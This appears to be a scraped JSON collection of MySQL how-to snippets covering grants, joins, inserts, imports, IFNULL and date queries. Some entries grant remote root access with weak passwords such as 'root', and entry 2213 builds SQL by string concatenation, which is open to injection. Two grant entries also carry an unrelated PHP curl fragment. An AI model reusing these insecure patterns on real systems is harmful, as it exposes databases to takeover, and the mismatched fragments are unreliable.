    "description": "SELECT SUBDATE(NOW(),1);\nSELECT * FROM my_table WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 DAY)\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2181,
    "keyword": null,
    "link": null,
    "title": " mysql go into database",
    "description": "use DBNAME;\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2182,
    "keyword": null,
    "link": null,
    "title": " mysql gran",
    "description": "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\nGRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2183,
    "keyword": null,
    "link": null,
    "title": " mysql grant",
    "description": "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\ncreate database [DB name];  CREATE USER '[DB_User_Name]'@'localhost' IDENTIFIED BY '[DB_Password]'; GRANT ALL PRIVILEGES ON [DB_Name].* TO '[DB_User_Name]'@'localhost';  show grants for 'demouser'@'localhost';  FLUSH PRIVILEGES;\nGRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';\n-- Grants list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost'; \nif(curl_exec($ch) === false) {     echo 'Curl error: ' . curl_error($ch); } else {     echo 'Operation completed without any errors';\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2184,
    "keyword": null,
    "link": null,
    "title": " mysql grant all privileges on *.* to 'root'@' ' identified by",
    "description": "mysql> CREATE USER 'root'@'%' IDENTIFIED BY 'PASSWORD'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION; mysql> FLUSH PRIVILEGES; \nmysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; \n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2185,
    "keyword": null,
    "link": null,
    "title": " mysql grant all privileges to a user",
    "description": "GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2186,
    "keyword": null,
    "link": null,
    "title": " mysql grant all privileges to user from any host",
    "description": "GRANT ALL PRIVILEGES ON database_name. * TO 'username'@'localhost';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON mydb.* TO 'myuser'@'%' WITH GRANT OPTION;  /* I hope it will help you. Namaste */\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2187,
    "keyword": null,
    "link": null,
    "title": " mysql grant grant option",
    "description": "GRANT ALL ON *.* TO 'user'@'localhost';  GRANT GRANT OPTION ON *.* TO 'user'@'localhost';\nif(curl_exec($ch) === false) {     echo 'Curl error: ' . curl_error($ch); } else {     echo 'Operation completed without any errors';\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2188,
    "keyword": null,
    "link": null,
    "title": " mysql group by date",
    "description": "GROUP BY DATE_FORMAT(record_date, '%Y%m')\nselect count(*), DATE_FORMAT(timestamp, \"%Y-%m-01\") from title group by DATE_FORMAT(timestamp, \"%Y-%m-01\")\nGROUP BY DATE_FORMAT(created_at, '%Y%m%d')\nSELECT SUM(foo), DATE(mydate) FROM a_table GROUP BY DATE(a_table.mydate);\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2189,
    "keyword": null,
    "link": null,
    "title": " mysql group by day",
    "description": "GROUP BY DATE_FORMAT(record_date, '%Y%m')\nselect count(*), DATE_FORMAT(timestamp, \"%Y-%m-01\") from title group by DATE_FORMAT(timestamp, \"%Y-%m-01\")\nGROUP BY DATE_FORMAT(created_at, '%Y%m%d')\nSELECT SUM(foo), DATE(mydate) FROM a_table GROUP BY DATE(a_table.mydate);\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2190,
    "keyword": null,
    "link": null,
    "title": " mysql group by limit",
    "description": "CREATE TABLE yourtable (   year int,   id varchar(20),   rate decimal(10,2) );  SELECT yourtable.* FROM   yourtable  INNER JOIN (   SELECT   id, GROUP_CONCAT(year ORDER BY rate DESC) grouped_year   FROM     yourtable   GROUP BY id) group_max ON yourtable.id = group_max.id AND FIND_IN_SET(year, grouped_year) <=5 ORDER BY yourtable.id, yourtable.year DESC;\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2191,
    "keyword": null,
    "link": null,
    "title": " mysql group by month",
    "description": "GROUP BY DATE_FORMAT(record_date, '%Y%m')\nselect count(*), DATE_FORMAT(timestamp, \"%Y-%m-01\") from title group by DATE_FORMAT(timestamp, \"%Y-%m-01\")\nGROUP BY DATE_FORMAT(created_at, '%Y%m%d')\nSELECT SUM(foo), DATE(mydate) FROM a_table GROUP BY DATE(a_table.mydate);\n",
    "reg_date": "2021-10-12T09:57:18.000Z"
  },
  {
    "id": 2192,
    "keyword": null,
    "link": null,
    "title": " mysql group concat",
    "description": "SELECT GROUP_CONCAT(DISTINCT categories ORDER BY categories ASC SEPARATOR ' ') FROM table \nmysql> select Id,group_concat(Name SEPARATOR ',') as GroupConcatDemo from GroupConcatenateDemo    -> group by Id;\nGROUP_CONCAT(eng_category_name SEPARATOR ',') as eng_category_name\nGROUP_CONCAT(expr); \n/* By deafult separe itens by \",\" */ group_concat(p.nameItem) as listProdItem /* Used <br> to list itens one below the other in HTML page */ group_concat(p.nameItem separator '<br>') as listProdItem\nSELECT li.client_id, group_concat(li.percentage ORDER BY li.views ASC) AS views,  group_concat(li.percentage ORDER BY li.percentage ASC)  FROM li GROUP BY client_id \n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2193,
    "keyword": null,
    "link": null,
    "title": " mysql group concat distinct",
    "description": "SELECT GROUP_CONCAT(DISTINCT categories ORDER BY categories ASC SEPARATOR ' ') FROM table \n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2194,
    "keyword": null,
    "link": null,
    "title": " mysql history command",
    "description": "cat ~/.mysql_history\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2195,
    "keyword": null,
    "link": null,
    "title": " mysql how to change default charset",
    "description": "ALTER DATABASE databasename CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE tablename CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\nmysql> SHOW VARIABLES LIKE 'char%'; SHOW VARIABLES LIKE 'collation%'; +--------------------------+----------------------------+ | Variable_name            | Value                      | +--------------------------+----------------------------+ | character_set_client     | utf8mb4                    | | character_set_connection | utf8mb4                    | | character_set_database   | utf8mb4                    | | character_set_filesystem | binary                     | | character_set_results    | utf8mb4                    | | character_set_server     | utf8mb4                    | | character_set_system     | utf8                       | | character_sets_dir       | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 8 rows in set (0.00 sec)  +----------------------+--------------------+ | Variable_name        | Value              | +----------------------+--------------------+ | collation_connection | utf8mb4_general_ci | | collation_database   | utf8mb4_unicode_ci | | collation_server     | utf8mb4_unicode_ci | +----------------------+--------------------+ 3 rows in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2196,
    "keyword": null,
    "link": null,
    "title": " mysql how to store lat,lng",
    "description": "lat DECIMAL(10, 8), lng DECIMAL(11, 8) ;\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2197,
    "keyword": null,
    "link": null,
    "title": " mysql how to truncate table with foreign keys",
    "description": "SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE table1;  SET FOREIGN_KEY_CHECKS = 1;\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2198,
    "keyword": null,
    "link": null,
    "title": " mysql id of inserted row",
    "description": "-- For mysql INSERT INTO table_name (col1, col2,...) VALUES ('val1', 'val2'...); SELECT LAST_INSERT_ID();\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2199,
    "keyword": null,
    "link": null,
    "title": " mysql identified by syntax error",
    "description": "# You don't use IDENTIFIED BY in GRANT queries, it's used in CREATE USER CREATE USER 'root'@'%' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'root'@'%';\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2200,
    "keyword": null,
    "link": null,
    "title": " mysql if else",
    "description": "IF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\nIF condition THEN    statements; ELSE    else-statements; END IF;\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2201,
    "keyword": null,
    "link": null,
    "title": " mysql if multiple conditions",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:19.000Z"
  },
  {
    "id": 2202,
    "keyword": null,
    "link": null,
    "title": " mysql if null",
    "description": "SELECT IFNULL(field, 0) AS field FROM products WHERE id = 1  SELECT IFNULL(SUM(field), 0) as field FROM products\nSELECT *  FROM table  WHERE YourColumn IS NOT NULL;\n##syntax: SELECT IFNULL(col_with_null_value, default_value);  ##you can see the result select with the string NA where the document is null: SELECT IFNULL(user_document_id, 'NA');\nSELECT * FROM contacts WHERE last_name IS NULL;\nIFNULL(MAX(EMAIL), \"example@google.com\") as email\nSELECT * from TABLE where CODE IS NULL OR CODE!='C'\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2203,
    "keyword": null,
    "link": null,
    "title": " mysql if statement",
    "description": "IF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\n-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\nIF condition THEN    statements; ELSE    else-statements; END IF;\nSELECT  `id` ,  `naam`  FROM  `klanten`  WHERE IF(`email` != '', `email`, `email2`) LIKE  '%@domain.nl%'\n   IF(condition, value_if_true, value_if_false)\nSELECT IF(500<1000, \"YES\", \"NO\");\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2204,
    "keyword": null,
    "link": null,
    "title": " mysql if statement in where clause",
    "description": "SELECT  `id` ,  `naam`  FROM  `klanten`  WHERE IF(`email` != '', `email`, `email2`) LIKE  '%@domain.nl%'\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2205,
    "keyword": null,
    "link": null,
    "title": " mysql ifnull",
    "description": "##syntax: SELECT IFNULL(col_with_null_value, default_value);  ##you can see the result select with the string NA where the document is null: SELECT IFNULL(user_document_id, 'NA');\nIF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\n SELECT      contactname, IFNULL(bizphone, homephone) phone FROM     contacts;\nIFNULL(MAX(EMAIL), \"example@google.com\") as email\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2206,
    "keyword": null,
    "link": null,
    "title": " mysql illegal mix of collations for operation 'join'",
    "description": "SELECT table_schema, table_name, column_name, character_set_name, collation_name FROM information_schema.columns WHERE collation_name = 'latin1_general_ci' ORDER BY table_schema, table_name,ordinal_position;   ALTER TABLE tbl_name CONVERT TO CHARACTER SET latin1 COLLATE 'latin1_swedish_ci'\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2207,
    "keyword": null,
    "link": null,
    "title": " mysql import command windows",
    "description": "C:\\wamp\\bin\\mysql\\mysql5.0.51b\\bin>mysql -u root -p YourDatabaseName < YourFileName.sql\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2208,
    "keyword": null,
    "link": null,
    "title": " mysql import from sql file",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql ; OR  mysql> use db_name;  mysql> source file_name.sql;\n mysql> use db_name;  mysql> source file_name.sql;\nLOAD DATA INFILE \"name.csv\" INTO TABLE \"TableName\" FIELDS TERMINATED BY \"sign\" LINES TERMINATED BY \"sign\" IGNORE 1 LINES (columns);\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2209,
    "keyword": null,
    "link": null,
    "title": " mysql import gz",
    "description": "zcat /path/to/file.sql.gz | mysql -u 'root' -p your_database \n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2210,
    "keyword": null,
    "link": null,
    "title": " mysql import gzip db",
    "description": "gunzip -c /path/to/file.sql.gz | mysql -u 'root' -p your_database\nzcat /path/to/file.sql.gz | mysql -u 'root' -p your_database \n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2211,
    "keyword": null,
    "link": null,
    "title": " mysql import sql file",
    "description": "mysql -u username -p database_name < file.sql\nmysql -u username -p database_name < file.sql ; OR  mysql> use db_name;  mysql> source file_name.sql;\n mysql> use db_name;  mysql> source file_name.sql;\nSource : https://www.programmingquest.com/2018/08/how-to-export-mysql-database-using.html open cmd set mysql path in cmd \tset path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin For database import (Restore):  \tmysql -u YourUser -p YourDatabaseName < filename.sql\nmysql>create database yourDatabaseName; mysql>use yourDatabaseName;\nzcat /path/to/file.sql.gz | mysql -u 'root' -p your_database\n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2212,
    "keyword": null,
    "link": null,
    "title": " mysql in",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\nSELECT      column1,column2,... FROM     table_name WHERE  \t(expr|column_1) IN ('value1','value2',...);\nSELECT      column1,column2,... FROM     table_name WHERE      column1 IN ('value1','value2',...); \nSELECT * from fiberbox where field REGEXP '1740|1938|1940'; \nGRANT CREATE ON *.* TO 'testuser'@'localhost';  \n",
    "reg_date": "2021-10-12T09:57:20.000Z"
  },
  {
    "id": 2213,
    "keyword": null,
    "link": null,
    "title": " mysql increment value by 1 in update",
    "description": "mysql_query(\"     UPDATE member_profile      SET points = points + 1     WHERE user_id = '\".$userid.\"' \"); \n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2214,
    "keyword": null,
    "link": null,
    "title": " mysql inner join",
    "description": "SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\nJOINING 2 Tables in sql  SELECT X.Column_Name , Y.Column_Name2 FROM TABLES1_NAME X  INNER JOIN TABLES2_NAME Y ON X.Primary_key = Y.Foreign_key;   --FOR EXAMPLE --GET THE FIRST_NAME AND JOB_TITLE --USE EMPLOYEES AND JOBS TABLE --THE RELATIONSHIP IS JOB_ID  SELECT E.FIRST_NAME , J.JOB_TITLE FROM EMPLOYEES E INNER JOIN JOBS J ON J.JOB_ID = E.JOB_ID;  \n-- Rows with ID existing in both a and b -- JOIN is equivalent to INNER JOIN SELECT a.ID, a.NAME, b.VALUE1 FROM table1 a    JOIN table2 b ON a.ID = b.ID WHERE a.ID >= 1000; -- &dArr; Test it &dArr; (Fiddle source link)\nA relational database consists of multiple related tables linking together using common columns which are known as foreign key columns. Because of this, data in each table is incomplete from the business perspective. MySQL supports the following types of joins:  Inner join Left join Right join Cross join  The following shows the basic syntax of the inner join clause that joins two tables table_1 and table_2:  SELECT column_list FROM table_1 INNER JOIN table_2 ON join_condition;   SELECT column_list FROM table_1 INNER JOIN table_2 USING (column_name);  SELECT column_list  FROM table_1  LEFT JOIN table_2 USING (column_name); Here is the syntax of the right join:  SELECT column_list  FROM table_1  RIGHT JOIN table_2 ON join_condition;  The following shows the basic syntax of the cross join clause:  SELECT select_list FROM table_1 CROSS JOIN table_2;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2215,
    "keyword": null,
    "link": null,
    "title": " mysql innerjoin",
    "description": "SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name = table2.column_name;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2216,
    "keyword": null,
    "link": null,
    "title": " mysql insert",
    "description": "INSERT INTO table_name(c1) VALUES(c1) ON DUPLICATE KEY UPDATE c1 = VALUES(c1) + 1;\n--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nINSERT INTO films    (code, title, did, date_prod, kind)     VALUES    ('T_601', 'Yojimbo', 106, '1961-06-16', 'Drama');\nINSERT INTO joke(joke_text, joke_date, author_id) VALUES (&lsquo;Humpty Dumpty had a great fall.&rsquo;, &lsquo;1899&ndash;03&ndash;13&rsquo;,          (SELECT id FROM author WHERE author_name = &lsquo;Famous Anthony&rsquo;));\nINSERT INTO table1 (col1, col2) VALUES (3, 'A string'); INSERT INTO table1 (col1) VALUES (3);\t\t\t-- col2 will be NULL if allowed INSERT INTO table1 VALUES (3, 'A string');     \t-- all table1 columns INSERT INTO table1 (col1, col2) SELECT value3, value1 FROM table2;\nINSERT INTO table_name (a, b) VALUES (val1, val2);  INSERT INTO table_name (a, b) VALUES (val1, val2), (val3, val4); -- 2 rows  -- From a query: INSERT INTO table_name (a, b)  \tSELECT val1 AS a, val2 AS b      FROM source_table s \tWHERE s.val1 >= 10;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2217,
    "keyword": null,
    "link": null,
    "title": " mysql insert from local csv",
    "description": "LOAD DATA LOCAL INFILE 'abc.csv' INTO TABLE abc FIELDS TERMINATED BY ','  ENCLOSED BY '\"'  LINES TERMINATED BY '\\n' IGNORE 1 LINES (col1, col2, col3, col4, col5...);\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2218,
    "keyword": null,
    "link": null,
    "title": " mysql insert generate serie",
    "description": "WITH RECURSIVE sequence AS (     SELECT 1 AS level     UNION ALL     SELECT level + 1 AS value     FROM sequence     WHERE sequence.level < 10 ) SELECT level FROM sequence;\nSELECT  @curRow := @curRow + 1 AS row_number FROM    sometable  JOIN    (SELECT @curRow := 0) r WHERE   @curRow<100;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2219,
    "keyword": null,
    "link": null,
    "title": " mysql insert into if not exists",
    "description": "INSERT INTO table_listnames (name, address, tele) SELECT * FROM (SELECT 'Unknown' AS name, 'Unknown' AS address, '022' AS tele) AS tmp WHERE NOT EXISTS (     SELECT name FROM table_listnames WHERE name = 'Rupert' ) LIMIT 1;\nINSERT INTO table_name (firstname, lastname) SELECT 'NEW FIRSTNAME', 'NEW LASTNAME' FROM DUAL WHERE NOT EXISTS(     SELECT 1     FROM table_name     WHERE firstname = 'NEW FIRSTNAME' AND lastname = 'NEW LASTNAME' ) LIMIT 1;\nINSERT IGNORE INTO companies     (id, full_name, address, phone_number) VALUES     (1, 'Apple', '1 Infinite Loop, Cupertino, California', 18002752273); \nINSERT IGNORE INTO `transcripts` SET `ensembl_transcript_id` = 'ENSORGT00000000001', `transcript_chrom_start` = 12345, `transcript_chrom_end` = 12678;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2220,
    "keyword": null,
    "link": null,
    "title": " mysql insert on dupèlicate",
    "description": "INSERT INTO table_name(c1) VALUES(c1) ON DUPLICATE KEY UPDATE c1 = VALUES(c1) + 1;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2221,
    "keyword": null,
    "link": null,
    "title": " mysql insert row",
    "description": "INSERT INTO table1 (col1, col2) VALUES (3, 'A string'); INSERT INTO table1 (col1) VALUES (3);\t\t\t-- col2 will be NULL if allowed INSERT INTO table1 VALUES (3, 'A string');     \t-- all table1 columns INSERT INTO table1 (col1, col2) SELECT value3, value1 FROM table2;\nINSERT INTO tbl_name (a,b,c)      VALUES(1,2,3), (4,5,6), (7,8,9);\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2222,
    "keyword": null,
    "link": null,
    "title": " mysql insert trigger",
    "description": "DELIMITER //  CREATE TRIGGER contacts_after_insert AFTER INSERT    ON contacts FOR EACH ROW BEGIN    -- Insert record into audit table    INSERT INTO contacts_audit    ( contact_id,      created_date,      created_by)    VALUES    ( NEW.contact_id,      SYSDATE(),      \"Admin\" ); END; //  DELIMITER ;\n",
    "reg_date": "2021-10-12T09:57:21.000Z"
  },
  {
    "id": 2223,
    "keyword": null,
    "link": null,
    "title": " mysql install windows 10",
    "description": "Just go to  https://dev.mysql.com/downloads/installer/ Choose your os and version  Follow the Microsoft instaler(msi) steps and install.  Its actually easy if you install Xamp or Wamp. I don't know if this helped.  Good Luck :)\nsudo apt-get install mysql-server mysql-client libmysqlclient-dev\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2224,
    "keyword": null,
    "link": null,
    "title": " mysql int range",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2225,
    "keyword": null,
    "link": null,
    "title": " mysql interval 1 day",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\nSELECT * FROM FOO WHERE MY_DATE_FIELD >= NOW() - INTERVAL 1 DAY\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2226,
    "keyword": null,
    "link": null,
    "title": " mysql into outfile with headers",
    "description": "SELECT * FROM (     SELECT 'username','email'     UNION ALL     (         SELECT `username`,`email`,`steam_id` FROM `users` WHERE `userna` LIKE '%@temp%'     ) ) resulting_set INTO OUTFILE '/results/result.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"' LINES TERMINATED BY '\\n';\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2227,
    "keyword": null,
    "link": null,
    "title": " mysql ip address",
    "description": "-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php <?php var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\" ?>\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2228,
    "keyword": null,
    "link": null,
    "title": " mysql ip address data type",
    "description": "-- `ip_address` int(4) unsigned NOT NULL INSERT INTO my_table (`ip_address`) VALUES (INET_ATON(\"127.0.0.1\")); SELECT INET_NTOA(ip_address) as ip FROM my_table; -- php <?php var_dump(ip2long('123.63.153.253'));\t-- 2067765757 var_dump(long2ip(2067765757));\t\t\t-- \"123.63.153.253\" ?>\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2229,
    "keyword": null,
    "link": null,
    "title": " mysql is in list",
    "description": "SELECT      column1,column2,... FROM     table_name WHERE  \t(expr|column_1) IN ('value1','value2',...);\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2230,
    "keyword": null,
    "link": null,
    "title": " mysql jdbc connection url",
    "description": "jdbc:mysql://host1:33060/sakila\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2231,
    "keyword": null,
    "link": null,
    "title": " mysql jdbc query",
    "description": "Connection conn = DriverManager.getConnection(url,username,password); Statement stmt  = conn.createStatement(); String sql = \"SELECT first_name, last_name, email \" +              \"FROM candidates\"; ResultSet rs    = stmt.executeQuery(sql)\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2232,
    "keyword": null,
    "link": null,
    "title": " mysql jdbc timezone",
    "description": "String url =  \"jdbc:mysql://localhost/mydb?useLegacyDatetimeCode=false&serverTimezone=America/New_York\";\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2233,
    "keyword": null,
    "link": null,
    "title": " mysql join query",
    "description": "SELECT      m.member_id,      m.name member,      c.committee_id,      c.name committee FROM     members m INNER JOIN committees c  \tON c.name = m.name;\n-- MySQL INNER JOINS return all rows from multiple tables where the join condition is met.  SELECT columns FROM table1  INNER JOIN table2 ON table1.column = table2.column;  -- LEFT OUTER JOIN -- Another type of join is called a MySQL LEFT OUTER JOIN. This type of join returns all rows from the LEFT-hand table specified in the ON condition and only those rows from the other table where the joined fields are equal (join condition is met).  SELECT columns FROM table1 LEFT JOIN table2 ON table1.column = table2.column;  -- RIGHT OUTER JOIN -- Another type of join is called a MySQL RIGHT OUTER JOIN. This type of join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where the joined fields are equal (join condition is met).  SELECT columns FROM table1 RIGHT JOIN table2 ON table1.column = table2.column;  -- The mySQL CROSS JOIN produces a result set which is the number of rows in the first table multiplied by the number of rows in the second table if no WHERE clause is used along with CROSS JOIN. This kind of result is called as Cartesian Product.  -- If WHERE clause is used with CROSS JOIN, it functions like an INNER JOIN.  SELECT columns FROM table1  CROSS JOIN table2;\nA relational database consists of multiple related tables linking together using common columns which are known as foreign key columns. Because of this, data in each table is incomplete from the business perspective. MySQL supports the following types of joins:  Inner join Left join Right join Cross join  The following shows the basic syntax of the inner join clause that joins two tables table_1 and table_2:  SELECT column_list FROM table_1 INNER JOIN table_2 ON join_condition;   SELECT column_list FROM table_1 INNER JOIN table_2 USING (column_name);  SELECT column_list  FROM table_1  LEFT JOIN table_2 USING (column_name); Here is the syntax of the right join:  SELECT column_list  FROM table_1  RIGHT JOIN table_2 ON join_condition;  The following shows the basic syntax of the cross join clause:  SELECT select_list FROM table_1 CROSS JOIN table_2;\nJoins are used with select statement. it is used to select data from multiple table. Types: MySQL INNER JOIN (or simple join) MySQL LEFT OUTER JOIN (or LEFT JOIN) MySQL RIGHT OUTER JOIN (or RIGHT JOIN)  Inner JOIN : The INNER JOIN is used to return all rows from multiple tables where the join condition is satisfied. It is the most common type of join.  Left Outer Join: The LEFT OUTER JOIN returns all rows from the left hand table specified in the ON condition and only those rows from the other table where the join condition is fulfilled.  Right Outer Join: The Right Outer Join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where he join condition is fulfilled.\n",
    "reg_date": "2021-10-12T09:57:22.000Z"
  },
  {
    "id": 2234,
    "keyword": null,
    "link": null,
    "title": " mysql join same table multiple times group by",
    "description": "SELECT      ticket.ticket_id,       a1.attr_val AS attr_val1,     a2.attr_val AS attr_val2,     a3.attr_val AS attr_val3 FROM ticket     LEFT JOIN attr a1 ON ticket.ticket_id=a1.ticket_id AND a1.attr_type=1     LEFT JOIN attr a2 ON ticket.ticket_id=a2.ticket_id AND a2.attr_type=2     LEFT JOIN attr a3 ON ticket.ticket_id=a3.ticket_id AND a3.attr_type=3 \n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2235,
    "keyword": null,
    "link": null,
    "title": " mysql join two tables",
    "description": "SELECT user_id, user_name FROM users UNION SELECT organization_id, organization_name FROM organizations\ncreate table yourTableName (    select *from yourTableName1 ) UNION (    select *from yourTableName2 );\nJoins are used with select statement. it is used to select data from multiple table. Types: MySQL INNER JOIN (or simple join) MySQL LEFT OUTER JOIN (or LEFT JOIN) MySQL RIGHT OUTER JOIN (or RIGHT JOIN)  Inner JOIN : The INNER JOIN is used to return all rows from multiple tables where the join condition is satisfied. It is the most common type of join.  Left Outer Join: The LEFT OUTER JOIN returns all rows from the left hand table specified in the ON condition and only those rows from the other table where the join condition is fulfilled.  Right Outer Join: The Right Outer Join returns all rows from the RIGHT-hand table specified in the ON condition and only those rows from the other table where he join condition is fulfilled.\n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2236,
    "keyword": null,
    "link": null,
    "title": " mysql kill",
    "description": "SELECT CONCAT('KILL ',id,';') AS IDs FROM information_schema.processlist  WHERE TIME >10 AND command = \"sleep\" \nmysql> SELECT GROUP_CONCAT(CONCAT('KILL ',id,';') SEPARATOR ' ')    FROM information_schema.processlist WHERE user <> 'system user'; \n",
    "reg_date": "2021-10-12T09:57:23.000Z"
  },
  {
    "id": 2237,
    "keyword": null,
    "link": null,
    "title": " mysql last 6 months",
